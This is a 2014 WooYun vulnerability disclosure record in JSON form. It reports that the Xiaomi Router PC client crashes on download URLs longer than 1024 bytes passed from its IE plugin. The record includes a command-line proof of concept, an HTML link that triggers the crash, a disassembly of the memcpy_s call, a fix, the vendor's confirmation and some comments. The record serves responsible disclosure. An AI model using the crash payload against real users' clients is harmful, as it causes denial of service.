{"id": 2515, "wybug_id": "wooyun-2014-059303", "wybug_title": "小米路由PC端超长下载URL地址导致程序崩溃", "wybug_corp": "小米科技", "wybug_author": "New4", "wybug_date": "2014-05-03 21:21", "wybug_open_date": "2014-08-01 21:22", "wybug_type": "拒绝服务", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端程序设计错误", "拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-01：\t细节向公众公开  简要描述： 小米路由PC端在接收IE插件传入的URL地址，未对输入字符长度进行严格控制。memcpy_s拷贝字符大于1024字节导致程序异常退出。 详细说明：  测试环境：WinXp SP3 IE6.0使用IE插件右键“使用小米路由器下载”菜单，传入超长URL地址会导致小米路由器PC客户端异常退出。超过1024字节就导致程序崩溃（char[1024]），程序没有做好判断和限制。这里使用安全版的memcpy_s，所以没有导致非常严重的缓冲区溢出。只是崩溃！0046D149  |.  E8 90B01200   CALL MiRouter.005981DE 漏洞关键点ollydbg带参数执行调试立马见效测试方法：\"C:\\Program Files\\XiaoMi\\MiRouter\\MiRouter.exe\" /url http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   漏洞证明：  保存html代码可以测试崩溃效果\n<a href=\"http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" target=\"_blank\">测试</a>\n\n\n关键代码块\nloc_46D13D:lea     ecx, [esi+esi+2]push    ecx             ; MaxCountpush    ebp             ; Srcpush    400h            ; DstSize  400h转换过来就是1024push    eax             ; Dstcall    _memcpy_s 这里执行拷贝操作add     esp, 10hcall    sub_46D160pop     esipop     edipop     ebpretn    4sub_46D0D0 endp\n\n\n   修复方案：  检查输入字符长度，或者限制输入字符长度。   版权声明：转载请注明来源 New4@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-05-05 11:24 厂商回复： 问题已着手处理,感谢您对小米安全的关注！ : ) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-03 23:49 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  已早于洞主30秒从其他渠道获取，感谢你对小米安全的关注！    \n     2014-05-04 08:46 |    \t\tkider脚本小子 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 系统软件安装及其调试。电脑硬件问题检测...)\t\t \n  楼上在装官方。。。屌丝还买不起小米路由，    \n     2014-05-04 12:14 |    \t\tCyrils \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:10        | the more the better)\t\t \n  new4...暗组？    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}